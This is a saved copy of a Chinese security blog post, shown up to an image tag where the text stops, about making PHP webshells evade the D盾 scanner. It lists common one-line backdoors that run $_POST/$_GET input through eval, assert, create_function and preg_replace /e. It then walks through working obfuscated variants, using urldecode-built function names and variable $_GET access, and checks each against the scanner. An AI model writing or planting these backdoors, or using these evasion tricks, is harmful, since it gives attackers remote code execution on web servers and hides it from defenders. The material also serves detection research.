@@ -1,0 +1,1165 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>[知识星球]WebShell免杀之PHP - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="[知识星球]WebShell免杀之PHP" />
+<meta property="og:description" content="1 前言php的免杀可以说是已经被说烂了。 由于php特别灵活，所产生的变种也是层出不穷 但是与此同时，D盾等waf的检测也格外严格。 有时候写的比" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/webshell-bypass-php/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-10-11T10:09:42+00:00" />
+<meta property="article:modified_time" content="2019-10-11T10:09:42+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="[知识星球]WebShell免杀之PHP"/>
+<meta name="twitter:description" content="1 前言php的免杀可以说是已经被说烂了。 由于php特别灵活，所产生的变种也是层出不穷 但是与此同时，D盾等waf的检测也格外严格。 有时候写的比"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/webshell-bypass-php/" /><link rel="prev" href="https://yzddmr6.com/posts/hack-pubg-cheat-site-2/" /><link rel="next" href="https://yzddmr6.com/posts/antsword-xor-encoder/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[知识星球]WebShell免杀之PHP",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/webshell-bypass-php\/"
+        },"genre": "posts","keywords": "webshell, 免杀","wordcount":  3811 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/webshell-bypass-php\/","datePublished": "2019-10-11T10:09:42+00:00","dateModified": "2019-10-11T10:09:42+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#确定免杀原型">确定免杀原型</a>
+      <ul>
+        <li><a href="#常见的php一句话原型">常见的PHP一句话原型</a></li>
+      </ul>
+    </li>
+    <li><a href="#打开语法手册">打开语法手册</a>
+      <ul>
+        <li><a href="#字符串操作函数">字符串操作函数</a></li>
+        <li><a href="#如何自定义函数">如何自定义函数</a></li>
+        <li><a href="#如何自定义类">如何自定义类</a></li>
+      </ul>
+    </li>
+    <li><a href="#免杀套路">免杀套路</a>
+      <ul>
+        <li><a href="#常规套路">常规套路</a></li>
+        <li><a href="#类调用">类调用</a></li>
+        <li><a href="#数组包裹">数组包裹</a></li>
+        <li><a href="#垃圾代码填充">垃圾代码填充</a></li>
+        <li><a href="#pop链">POP链</a></li>
+        <li><a href="#补充实例">补充实例</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[知识星球]WebShell免杀之PHP</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-10-11">2019-10-11</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-10-11">2019-10-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3811 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#确定免杀原型">确定免杀原型</a>
+      <ul>
+        <li><a href="#常见的php一句话原型">常见的PHP一句话原型</a></li>
+      </ul>
+    </li>
+    <li><a href="#打开语法手册">打开语法手册</a>
+      <ul>
+        <li><a href="#字符串操作函数">字符串操作函数</a></li>
+        <li><a href="#如何自定义函数">如何自定义函数</a></li>
+        <li><a href="#如何自定义类">如何自定义类</a></li>
+      </ul>
+    </li>
+    <li><a href="#免杀套路">免杀套路</a>
+      <ul>
+        <li><a href="#常规套路">常规套路</a></li>
+        <li><a href="#类调用">类调用</a></li>
+        <li><a href="#数组包裹">数组包裹</a></li>
+        <li><a href="#垃圾代码填充">垃圾代码填充</a></li>
+        <li><a href="#pop链">POP链</a></li>
+        <li><a href="#补充实例">补充实例</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>php的免杀可以说是已经被说烂了。</p>
+<p>由于php特别灵活，所产生的变种也是层出不穷</p>
+<p>但是与此同时，D盾等waf的检测也格外严格。</p>
+<p>有时候写的比较花，D盾虽然不认识，但他给你报一级或者二级变量函数就很难受。</p>
+<p>写这篇文章的目的不是仅仅让大家能够bypass D盾</p>
+<p>而是希望大家就算碰到没有见过的waf也能够掌握bypass的思路。</p>
+<p>所以这里跟着大家一起从0开始，一步步拓展思路，免杀D盾。</p>
+<h2 id="确定免杀原型" class="headerLink">
+    <a href="#%e7%a1%ae%e5%ae%9a%e5%85%8d%e6%9d%80%e5%8e%9f%e5%9e%8b" class="header-mark"></a>2 确定免杀原型</h2><p>首先确定你所要免杀的原型，在此基础上对其进行编码。</p>
+<h3 id="常见的php一句话原型" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%81%e7%9a%84php%e4%b8%80%e5%8f%a5%e8%af%9d%e5%8e%9f%e5%9e%8b" class="header-mark"></a>2.1 常见的PHP一句话原型</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php @eval($_POST[&#39;yzddmr6&#39;]); ?&gt;
+</span></span><span class="line"><span class="cl">&lt;?php @assert($_POST[&#39;yzddmr6&#39;]); ?&gt;
+</span></span><span class="line"><span class="cl">&lt;?php $ant=create_function(&#34;&#34;, base64_decode(&#39;QGV2YWwoJF9QT1NUWyJhbnQiXSk7&#39;));$ant();?&gt;
+</span></span><span class="line"><span class="cl">&lt;?php preg_replace(&#34;/test/e&#34;,$_GET[&#34;yzddmr6&#34;],&#34;test&#34;); ?&gt; 
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一般一句话的组成分为两个部分：执行跟传参</p>
+<p><code>$_POST['yzddmr6']</code>负责接收用户输入的参数</p>
+<p><code>eval</code>是负责将接收到的字符串执行</p>
+<p>免杀也就是分为这两部分来做。</p>
+<p>要么混淆执行部分，要么混淆传参部分，要么两者都混淆。</p>
+<p>这里要注意一下eval跟其他函数的不同：</p>
+<p><strong>eval 是一个语言构造器而不是一个函数，不能被可变函数调用</strong></p>
+<p>可变函数：通过一个变量，获取其对应的变量值，然后通过给该值增加一个括号()，让系统认为该值是一个函数，从而当做函数来执行</p>
+<p>意思就是说`` 这样是不行的</p>
+<p>所以在php7.x以下，assert要比eval灵活的多。</p>
+<p>但是在php7.1以上，assert同样也变成了一种语言结构，也就无法具有可变函数的特性。</p>
+<p>所以当你确定免杀原型为``的时候，就不能想着编码<code>eval</code>了，应该考虑怎么混淆传参部分。</p>
+<p>也就是把<code>$_POST['yzddmr6']</code>神不知鬼不觉的传到eval里</p>
+<p>如果确定原型是``就要考虑怎么把<code>assert</code>这个字符串拼接混淆。</p>
+<p>这里有人会问了，为什么waf不直接全面封杀eval，见到eval assert就报毒呢？</p>
+<p>因为在实际生产中确实需要eval函数，并不是所有带eval的都是后门。</p>
+<p>如果不分青红皂白就杀会导致误报，把正常文件杀了网站就无法正常运行了。</p>
+<h2 id="打开语法手册" class="headerLink">
+    <a href="#%e6%89%93%e5%bc%80%e8%af%ad%e6%b3%95%e6%89%8b%e5%86%8c" class="header-mark"></a>3 打开语法手册</h2><p>翻语法手册主要关注以下几点</p>
+<ul>
+<li>
+<p>字符串操作函数</p>
+</li>
+<li>
+<p>如何自定义函数</p>
+</li>
+<li>
+<p>如何自定义类</p>
+</li>
+</ul>
+<h3 id="字符串操作函数" class="headerLink">
+    <a href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%93%8d%e4%bd%9c%e5%87%bd%e6%95%b0" class="header-mark"></a>3.1 字符串操作函数</h3><p>想找比较全的可以点<a href="https://www.w3school.com.cn/php/php_ref_string.asp" target="_blank" rel="noopener noreferrer">这里</a></p>
+<p>下面我列举了一些常用的字符串变形函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">base64_encode()  字符串base64编码
+</span></span><span class="line"><span class="cl">base64_decode()		字符串base64解码
+</span></span><span class="line"><span class="cl">urlencode()   字符串url编码
+</span></span><span class="line"><span class="cl">urldecode()   字符串url解码
+</span></span><span class="line"><span class="cl">bin2hex()	把 ASCII 字符的字符串转换为十六进制值。
+</span></span><span class="line"><span class="cl">hex2bin()	把十六进制值的字符串转换为 ASCII 字符。
+</span></span><span class="line"><span class="cl">chr()	从指定的 ASCII 值返回字符。
+</span></span><span class="line"><span class="cl">ord()	返回字符串中第一个字符的 ASCII 值。
+</span></span><span class="line"><span class="cl">explode()	把字符串打散为数组。
+</span></span><span class="line"><span class="cl">implode()	返回由数组元素组合成的字符串。
+</span></span><span class="line"><span class="cl">parse_str()	把查询字符串解析到变量中。
+</span></span><span class="line"><span class="cl">str_ireplace()	替换字符串中的一些字符（对大小写不敏感）。
+</span></span><span class="line"><span class="cl">str_replace()	替换字符串中的一些字符（对大小写敏感）。
+</span></span><span class="line"><span class="cl">str_repeat()	把字符串重复指定的次数。
+</span></span><span class="line"><span class="cl">str_rot13()	对字符串执行 ROT13 编码。
+</span></span><span class="line"><span class="cl">str_shuffle()	随机地打乱字符串中的所有字符。
+</span></span><span class="line"><span class="cl">str_split()	把字符串分割到数组中。
+</span></span><span class="line"><span class="cl">strip_tags()	剥去字符串中的 HTML 和 PHP 标签。
+</span></span><span class="line"><span class="cl">stripos()	返回字符串在另一字符串中第一次出现的位置（对大小写不敏感）。
+</span></span><span class="line"><span class="cl">stristr()	查找字符串在另一字符串中第一次出现的位置（大小写不敏感）。
+</span></span><span class="line"><span class="cl">strlen()	返回字符串的长度。
+</span></span><span class="line"><span class="cl">strpos()	返回字符串在另一字符串中第一次出现的位置（对大小写敏感）。
+</span></span><span class="line"><span class="cl">strrev()	反转字符串。
+</span></span><span class="line"><span class="cl">strripos()	查找字符串在另一字符串中最后一次出现的位置（对大小写不敏感）。
+</span></span><span class="line"><span class="cl">strrpos()	查找字符串在另一字符串中最后一次出现的位置（对大小写敏感）。
+</span></span><span class="line"><span class="cl">strstr()	查找字符串在另一字符串中的第一次出现（对大小写敏感）。
+</span></span><span class="line"><span class="cl">substr()	返回字符串的一部分。
+</span></span><span class="line"><span class="cl">substr_replace()	把字符串的一部分替换为另一个字符串。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="如何自定义函数" class="headerLink">
+    <a href="#%e5%a6%82%e4%bd%95%e8%87%aa%e5%ae%9a%e4%b9%89%e5%87%bd%e6%95%b0" class="header-mark"></a>3.2 如何自定义函数</h3><p><a href="https:_www.runoob.com_php_php-functions" rel="">https://www.runoob.com/php/php-functions.html</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">function functionName()
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    // 要执行的代码
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="如何自定义类" class="headerLink">
+    <a href="#%e5%a6%82%e4%bd%95%e8%87%aa%e5%ae%9a%e4%b9%89%e7%b1%bb" class="header-mark"></a>3.3 如何自定义类</h3><p><a href="https:_www.runoob.com_php_php-oop" rel="">https://www.runoob.com/php/php-oop.html</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PHP 定义类通常语法格式如下：
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class phpClass {
+</span></span><span class="line"><span class="cl">  var $var1;
+</span></span><span class="line"><span class="cl">  var $var2 = &#34;constant string&#34;;
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  function myfunc ($arg1, $arg2) {
+</span></span><span class="line"><span class="cl">     [..]
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  [..]
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">解析如下：
+</span></span><span class="line"><span class="cl">类使用 class 关键字后加上类名定义。
+</span></span><span class="line"><span class="cl">类名后的一对大括号({})内可以定义变量和方法。
+</span></span><span class="line"><span class="cl">类的变量使用 var 来声明, 变量也可以初始化值。
+</span></span><span class="line"><span class="cl">函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="免杀套路" class="headerLink">
+    <a href="#%e5%85%8d%e6%9d%80%e5%a5%97%e8%b7%af" class="header-mark"></a>4 免杀套路</h2><p>一般的变形对于D盾根本不起作用，被杀的妈都不认，这也是为什么D盾在webshell查杀领域比较具有权威性。</p>
+<h3 id="常规套路" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%84%e5%a5%97%e8%b7%af" class="header-mark"></a>4.1 常规套路</h3><p>首先选择一个幸运儿函数，没错，我还选的是urldecode()(将字符串URL解码)</p>
+<p>选择我们的免杀原型``</p>
+<p>这里假设我以前从来不知道D盾这个玩意</p>
+<p>首先从零开始进行一些简单的尝试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$a=urldecode(&#39;%61%73%73%65%72%74&#39;);  //assert
+</span></span><span class="line"><span class="cl">$a($_GET[&#39;yzddmr6&#39;]);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查杀结果：</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430534-afb6c2b8-8ed4-4d49-880b-a39fc0bf6b19.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430534-afb6c2b8-8ed4-4d49-880b-a39fc0bf6b19.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430534-afb6c2b8-8ed4-4d49-880b-a39fc0bf6b19.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430534-afb6c2b8-8ed4-4d49-880b-a39fc0bf6b19.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430534-afb6c2b8-8ed4-4d49-880b-a39fc0bf6b19.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430534-afb6c2b8-8ed4-4d49-880b-a39fc0bf6b19.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>直接就一级了。。。看来D盾后来改规则了。。。</p>
+<p>可以看到他报了变量函数，并且指明了里面的参数，那么换个变量来代替GET传参试试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$a=urldecode(&#39;%61%73%73%65%72%74&#39;);
+</span></span><span class="line"><span class="cl">$b=$_GET[&#39;yzddmr6&#39;];
+</span></span><span class="line"><span class="cl">$a($b);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>D盾照样报了相同的警告，那么再把参数混淆一下？</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$a=urldecode(&#39;%61%73%73%65%72%74&#39;);
+</span></span><span class="line"><span class="cl">$b=urldecode(&#34;%5f%47%45%54&#34;);
+</span></span><span class="line"><span class="cl">$c=${$b}[&#39;mr6&#39;];
+</span></span><span class="line"><span class="cl">$a($c);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430627-b24da8f4-92d0-47d3-a06d-1b0a095df769.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430627-b24da8f4-92d0-47d3-a06d-1b0a095df769.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430627-b24da8f4-92d0-47d3-a06d-1b0a095df769.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430627-b24da8f4-92d0-47d3-a06d-1b0a095df769.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430627-b24da8f4-92d0-47d3-a06d-1b0a095df769.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430627-b24da8f4-92d0-47d3-a06d-1b0a095df769.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>这里就只报变量函数了，但是照样是1级。</p>
+<p>再混淆一下？</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">function test(){
+</span></span><span class="line"><span class="cl">    $a=urldecode(&#39;%61%73%73%65%72%74&#39;);
+</span></span><span class="line"><span class="cl">    if (&#39;a&#39;&gt;&#39;b&#39;){
+</span></span><span class="line"><span class="cl">        return ;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    else return $a;
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$b=urldecode(&#39;%24%5f%47%45%54%5b%27%79%7a%64%64%6d%72%36%27%5d&#39;);
+</span></span><span class="line"><span class="cl">$test=test();
+</span></span><span class="line"><span class="cl">$test($b);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430716-cd6e8407-7c48-40d6-869e-13183f1b2798.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430716-cd6e8407-7c48-40d6-869e-13183f1b2798.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430716-cd6e8407-7c48-40d6-869e-13183f1b2798.png"
